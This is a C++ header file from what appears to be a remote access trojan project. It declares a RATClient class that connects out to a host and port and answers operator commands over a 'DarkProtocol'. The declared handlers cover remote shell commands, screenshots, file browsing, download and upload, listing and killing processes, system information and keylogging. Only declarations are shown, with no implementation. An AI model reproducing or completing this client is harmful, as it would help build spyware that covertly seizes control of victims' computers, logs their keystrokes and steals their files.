#pragma once
#include "../shared/protocol.h"
#include <string>
#include <atomic>
#include <thread>

class RATClient {
public:
    explicit RATClient(const std::string& host, uint16_t port);
    ~RATClient();

    void Run();

private:
    void            ConnectLoop();
    void            CommandLoop(SOCKET sock);
    void            HandleShell(SOCKET sock, const std::string& payload);
    void            HandleScreenshot(SOCKET sock);
    void            HandleFileList(SOCKET sock, const std::string& path);
    void            HandleFileDownload(SOCKET sock, const std::string& path);
    void            HandleFileUpload(SOCKET sock, const std::string& remotePath);
    void            HandleProcessList(SOCKET sock);
    void            HandleProcessKill(SOCKET sock, const std::string& pidStr);
    void            HandleSysInfo(SOCKET sock);
    void            HandleKeylog(SOCKET sock, DarkProtocol::CommandID sub);

    std::string         m_host;
    uint16_t            m_port;
    std::atomic<bool>   m_running{ true };
};